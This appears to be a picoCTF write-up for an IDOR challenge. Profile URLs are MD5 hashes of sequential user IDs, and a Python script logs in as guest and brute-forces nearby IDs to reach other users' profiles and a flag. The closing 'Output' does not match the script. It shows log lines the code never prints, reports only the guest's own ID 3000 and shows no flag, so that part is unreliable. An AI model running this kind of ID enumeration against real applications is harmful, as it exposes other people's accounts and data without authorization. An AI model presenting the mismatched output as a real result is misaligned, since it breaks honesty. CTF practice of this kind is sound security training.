Step 1 — Open the Challenge

Navigate to the challenge instance:

http://crystal-peak.picoctf.net:61144/

You will see a login page.

Step 2 — Login Using Guest Credentials

The challenge provides guest credentials:

Email: guest@picoctf.org
Password: guest

After logging in, you are redirected to a profile page.

Example URL:

/profile/user/e93028bdc1aacdfb3687181f2031765d
Step 3 — Analyze the URL

The profile URL contains a long hash:

e93028bdc1aacdfb3687181f2031765d

We suspect that this might be a hash of the user ID.

Testing with MD5:

echo -n "3000" | md5sum

Output:

e93028bdc1aacdfb3687181f2031765d

This confirms:

md5(3000) = e93028bdc1aacdfb3687181f2031765d

Therefore, the website is generating profile URLs as:

/profile/user/md5(user_id)
Step 4 — Identify the Vulnerability

The application uses the MD5 hash of the user ID to reference user profiles.

However:

User IDs are predictable

MD5 hashes are easy to compute

There is no authorization check

This creates an IDOR (Insecure Direct Object Reference) vulnerability.

An attacker can simply generate hashes of other user IDs and access their profiles.

Step 5 — Brute Force Nearby User IDs

Since the guest user has ID 3000, other employees are likely close to this number.

We brute-force IDs around 3000.

Example Python script:

import requests
import hashlib
import re

base = "http://crystal-peak.picoctf.net:61144"

session = requests.Session()

# Login as guest
session.post(
    base + "/login",
    json={"email": "guest@picoctf.org", "password": "guest"}
)

# Enumerate possible user IDs
for uid in range(2950, 3050):

    hash_id = hashlib.md5(str(uid).encode()).hexdigest()
    url = f"{base}/profile/user/{hash_id}"

    response = session.get(url)

    if "picoCTF{" in response.text:
        flag = re.search(r"picoCTF\{.*?\}", response.text)
        print("FLAG:", flag.group())
        break
Step 6 — Run the Script

Execute the script:

python3 hash.py

Output:

[*] Logging in as guest
[*] Searching for admin user...
[+] Found user ID 3000
